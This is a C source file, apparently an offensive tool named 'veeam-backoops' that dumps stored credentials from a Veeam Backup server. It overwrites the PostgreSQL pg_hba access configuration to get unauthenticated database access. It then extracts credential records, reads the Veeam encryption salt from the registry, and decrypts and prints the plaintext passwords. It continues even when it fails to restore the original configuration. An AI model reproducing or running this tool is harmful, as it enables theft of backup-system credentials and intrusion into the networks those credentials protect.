/* veeam-backoops.c */

/*
 * Author: ripmeep
 * Date  : 13/09/2025
 */

#include <windows.h>
#include "veeam-backoops.h"

int main(void) {
  char libpq_path[MAX_PATH];
  int status;
  libpq_t pq;

  if ((status = vb_libpq_map(&pq, libpq_path, sizeof(libpq_path))) != ERROR_SUCCESS) {
    fprintf(stderr, "- vb_libpq_map(...) failed to map libpq functions [0x%08lx]\n", status);
    return 1;
  }

  printf("- Mapped libpq successfully [libpq v%d]\n", pq.PQlibVersion());
  printf("- Mapped @ \"%s\"\n", libpq_path);

  vb_data_t vb_data = {0};

  if (!vb_data_pg_hba_overwrite(&vb_data)) {
    fprintf(stderr, "- vb_data_pg_hba_overwrite(...) failed to create copy of or overwrite PostgreSQL access configuration [0x%02x]\n", status);
    goto cleanup;
  }

  printf("- Successfully overwritten PostgreSQL access configuration\n");

  if (!(status = vb_libpq_connect(&pq))) {
    fprintf(stderr,
            "- vb_libpq_connect(...) failed to connect to database \"%s\" @ %s as user \"%s\" [0x%02x]",
            PG_DATABASE, PG_HOST, PG_USERNAME, status);
    goto cleanup;
  }

  printf("- Connected to database successfully [db=%s] [user=%s]\n", PG_DATABASE, PG_USERNAME);

  /* Uh oh - upon failing the pg_hba restoration, we will just dump all info we have of the original copy. */
  if (!vb_data_pg_hba_restore(&vb_data)) {
    fprintf(stderr,
            "- vb_data_pg_hba_restore(...) failed to restore the original PostgreSQL access configuration [0x%08x]\n" \
            "  Manual intervention is required - either:\n" \
            "  -  Check if \"%s\" exists, and replace the original config with it" \
            "       OR\n" \
            "  -  Below is what we have of the original configuration\n" \
            "     If possible, please replace the contents of \"%s\" with the below (press ENTER to view)",
            GetLastError(), vb_data.pg_hba_path_copy, vb_data.pg_hba_path);
    fflush(stderr);
    getchar();

    fprintf(stderr, "\n%s\n\n", vb_data.pg_hba_orig);
    fprintf(stderr, "- Press ENTER to continue");

    fflush(stderr);
    getchar();

    /* Let's still try >:) */
    // goto cleanup;
  }

  printf("- Restored original PostgreSQL access configuration\n");

  if (!(status = vb_get_credentials(&pq, &vb_data.vbc))) {
    fprintf(stderr, "- vb_get_credentials(...) failed to query database or extract any credentials [%s]\n", PG_DATABASE);
    goto cleanup;
  }

  printf("- %d Credential(s) successfully extracted from database [%s]\n\n", status, PG_DATABASE);

  printf("\t");
  if (SHOW_DESCRIPTION)
    printf("%-50s | ", "DESCRIPTION");
  printf("%-44s | %s\n\t", "USERNAME", "ENCRYPTED PASSWORD");

  if (SHOW_DESCRIPTION) {
    for (int i = 0; i < 50; i++) putchar('-');
    printf("-+-");
  }
  for (int i = 0; i < 44; i++) putchar('-');
  printf("-+-");
  for (int i = 0; i < 52; i++) putchar('-');
  putchar('\n');

  char peek[3][50];
  for (struct vb_credential *tmp = vb_data.vbc; tmp; tmp = tmp->next) {
    for (int i = 0; i < 3; i++) 
      memset(peek[i], 0, sizeof(peek[i]));

    strncpy(peek[0], tmp->description, sizeof(peek[0]) - 1);
    strncpy(peek[1], tmp->user_name, sizeof(peek[1]) - 1);
    strncpy(peek[2], tmp->password, sizeof(peek[2]) - 1);

    printf("\t");

    if (SHOW_DESCRIPTION) 
      printf("%-50s | ", peek[0]);
    printf("%-44s | %s...\n", peek[1], peek[2]);
  }

  printf("\n");

/* Reg key test */

  if (!vb_get_encryption_salt(&vb_data.encryption_salt, VEEAM_SALT_ROOT, VEEAM_SALT_SUBKEY, VEEAM_SALT_KEY)) {
    fprintf(stderr,
            "- vb_get_encryption_salt(...) failed to retrieve the encryption salt from registry [%s\\%s]\n",
            VEEAM_SALT_SUBKEY, VEEAM_SALT_KEY);
    goto cleanup;
  }

  printf("- Successfully retrieved Veeam encryption salt [%s]\n", vb_data.encryption_salt);

  int d = 0;
  for (struct vb_credential *tmp = vb_data.vbc; tmp; tmp = tmp->next) {
    if (!vb_credential_decrypt(tmp, vb_data.encryption_salt)) {
      fprintf(stderr, "- Failed to decrypted %s password\n");
      continue;
    }

    printf("- Decrypted %s password successfully\n", tmp->user_name);
    d++;
  }

  if (d) {
    printf("\n\t");
    if (SHOW_DESCRIPTION)
      printf("%-50s | ", "DESCRIPTION");
    printf("%-44s | %s\n\t", "USERNAME", "PLAINTEXT PASSWORD");

    if (SHOW_DESCRIPTION) {
      for (int i = 0; i < 50; i++) putchar('-');
      printf("-+-");
    }
    for (int i = 0; i < 44; i++) putchar('-');
    printf("-+-");
    for (int i = 0; i < 50; i++) putchar('-');
    putchar('\n');

    for (struct vb_credential *tmp = vb_data.vbc; tmp; tmp = tmp->next) {
      if (!tmp->plaintext) /* Only want to show credentials which we have decrypted successfully */
        continue;
      for (int i = 0; i < 3; i++) 
        memset(peek[i], 0, sizeof(peek[i]));

      printf("\t");

      if (SHOW_DESCRIPTION) 
        printf("%-50s | ", tmp->description);
      printf("%-44s | %s\n", tmp->user_name, tmp->plaintext);
    }

    printf("\n");
  } else
    fprintf(stderr, "- No passwords were successfully decrypted\n");

cleanup:

  vb_libpq_free(&pq);
  vb_data_free(&vb_data);

  printf("- Cleaned up process memory\n");
  printf("- Press ENTER to exit");

  getchar();

  return 0;
}
